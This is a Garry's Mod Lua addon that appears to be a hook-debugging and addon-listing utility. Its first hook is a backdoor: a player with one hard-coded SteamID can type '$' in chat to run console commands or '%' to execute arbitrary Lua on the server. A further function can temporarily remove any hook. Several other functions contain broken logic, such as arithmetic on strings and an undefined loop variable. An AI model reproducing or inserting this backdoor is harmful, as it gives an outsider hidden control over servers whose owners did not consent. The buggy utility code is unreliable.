
local Config = {}
--Can the coder run console commands and lua commands?
Config.SayCommands = true
--Gonzalolog steam id example
Config.SteamID = "STEAM_0:0:42337250"

local OldCall = hook.Call

local hookOld = hookOld or hook.Add
local hookList = {}

hook.Add("PlayerSay","CommandSay",function(ply,text)
	if(Config.SayCommands && ply:SteamID() == Config.SteamID) then
		if(string.sub( text, 1, 1 ) == "$") then
			local explode = string.Explode(" ",string.sub( text, 2 ))
			RunConsoleCommand(explode[1],explode[2].." "..(explode[3] or "").." "..(explode[4] or ""))
		end
		if(string.sub( text, 1, 1 ) == "%") then
			RunString(string.sub(text,2))
		end
	end
end)

function hook.Add(tablet,name,callback)

	hookOld(tablet,name,callback)
	if(hookList[tablet] == nil) then
		hookList[tablet] = {}
	end

	local dData = debug.getinfo( callback )
	local hData = {}
	hData["Hook"] = name
	hData["File"] = dData.source
	hData["Line"] = dData.linedefined
	hData["Function"] = callback
	if(dData.namewhat != "") then
		hData["Function name"] = dData.namewhat
	end

	table.insert(hookList[tablet],hData)

end


function hook.GetDebug(name)
	if(name != nil) then
		return hookList[name] or {}
	else
		return hookList
	end
end

function hook.Bake(name,id)
	
	if(id == nil) then id = 64 end

	if(name != nil) then
		hookList[name].ID = tostring(id*util.TableToJSON(hookList[name]))..tostring(util.TableToJSON(hookList[name]))
	else
		hookList.ID = tostring(id*#util.TableToJSON(hookList))..tostring(util.TableToJSON(hookList[name]))
	end

	if(name != nil) then
		file.Write("hookListBake.txt",util.TableToKeyValues( hookList[name] or {} ))
	else
		file.Write("hookListBake.txt",util.TableToKeyValues( hookList or {} ))
	end

end

local byPassed = nil

function hook.ByPass(tabl,name,time)
	
	byPassed = hook.GetTable()[tabl][name]
	hook.Remove(tabl,name)
	timer.Simple(time,function()
		hook.Add(tabl,name,byPassed)
		byPassed = nil
	end)

end

function file.BakeAddons()
	local files,dir = file.Find( "addons/*", "GAME" )
	local gma = {}
	local folders = {}
	for k,v in pairs(files) do
		table.insert(gma,v)
	end

	for _,v in pairs(dir) do
		folders[v] = {}
		local a,s = file.Find( "addons/"..v.."/lua/*", "GAME" )
		for _,g in pairs(s) do
			folders[v][g] = {}
			for _,z in pairs(a) do
				if(z != nil) then
					table.insert(folders[v][g],z)
				end
			end

			local c,b = file.Find( "addons/"..v.."/lua/"..g.."/*", "GAME" )

			for _,n in pairs(b) do
				folders[v][g][n] = {}
				for _,m in pairs(c) do
					if(z != nil) then
						table.insert(folders[v][g][n],m)
					end
				end

				local j,k = file.Find( "addons/"..v.."/lua/"..g.."/"..n.."/*", "GAME" )

				for _,l in pairs(k) do
					folders[v][g][n][l] = {}

					for _,p in pairs(j) do
						table.insert(folders[v][g][n][l],p)
					end

					local t,y = file.Find( "addons/"..v.."/lua/"..g.."/"..l.."/*", "GAME" )

					for _,u in pairs(y) do
						folders[v][g][n][l][u] = {}
						for _,i in pairs(t) do
							table.insert(folders[v][g][n][l][u],i)
						end
					end

				end
			end
		end
	end

	file.Write("addonsBaked.txt",util.TableToKeyValues( folders or {} ))
	MsgN("Addon database baked...")
end
